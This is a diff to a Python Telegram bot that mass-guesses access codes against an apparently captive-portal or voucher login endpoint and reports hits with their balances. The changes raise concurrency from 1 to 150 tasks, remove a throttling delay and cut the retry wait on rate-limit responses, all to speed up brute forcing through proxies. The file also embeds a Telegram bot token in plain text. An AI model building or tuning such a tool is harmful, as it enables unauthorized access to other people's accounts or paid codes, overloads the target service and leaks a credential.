@@ -23,8 +23,8 @@ from telegram.ext import Application, ContextTypes, CommandHandler, CallbackQuer
 nest_asyncio.apply()
 
 # ── CONFIGURATION ──────────────────────────────────────────────────────────
-MAX_CONCURRENT = 1   # တစ်ကြိမ်လျှင် ၁ ခုတည်းဖြင့် အေးဆေးမှန်ကန်စွာ စစ်ဆေးမည်
-CONNECTION_LIMIT = 5
+MAX_CONCURRENT = 150   # Speed ပိုမြန်စေရန် 150 ခုအထိ တိုးမြှင့်ထားသည်
+CONNECTION_LIMIT = 150
 ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
 TOKEN = "8892955827:AAGbWoGsCGnhbtVGBFWFNPPAVsoaNjCrZWk"
@@ -204,13 +204,10 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
                 
-                # အလွန်အကျွံ မဖြစ်စေရန် ခဏစောင့်ပေးခြင်း
-                await asyncio.sleep(1.0)
-
                 async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(2.0); continue
+                        context_data['retry_total'] += 1; await asyncio.sleep(0.5); continue
                     if 'logonUrl' in response or '"success":true' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
@@ -257,13 +254,20 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
 
     try:
         while not context.user_data.get('scan_stop', False):
-            code = next(code_gen, None)
-            if not code:
+            tasks = []
+            codes = []
+            for _ in range(MAX_CONCURRENT):
+                code = next(code_gen, None)
+                if not code: break
+                codes.append(code)
+                tasks.append(perform_check_silent(code, query.message.chat, session_url, connector, context.user_data))
+
+            if not tasks:
                 context.user_data['scan_stop'] = True
                 break
 
-            context.user_data['checked_total'] += 1
-            await perform_check_silent(code, query.message.chat, session_url, connector, context.user_data)
+            context.user_data['checked_total'] += len(codes)
+            await asyncio.gather(*tasks)
 
             if context.user_data.get('scan_stop', False): break
 
@@ -282,7 +286,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
             
             proxy_count = len(PROXY_LIST) if PROXY_LIST else 0
-            proxy_status = f"-1/{proxy_count}" if proxy_count > 0 else "0/0"
+            proxy_status = f"{proxy_count}/{proxy_count}" if proxy_count > 0 else "0/0"
 
             recent_hits = context.user_data.get('success_codes', [])[:25]
             hits_text = ""
@@ -315,7 +319,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
         hits_count = context.user_data.get('hits', 0)
         checked_count = context.user_data.get('checked_total', 0)
         try:
-            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ。\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
+            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
         except:
             pass
 
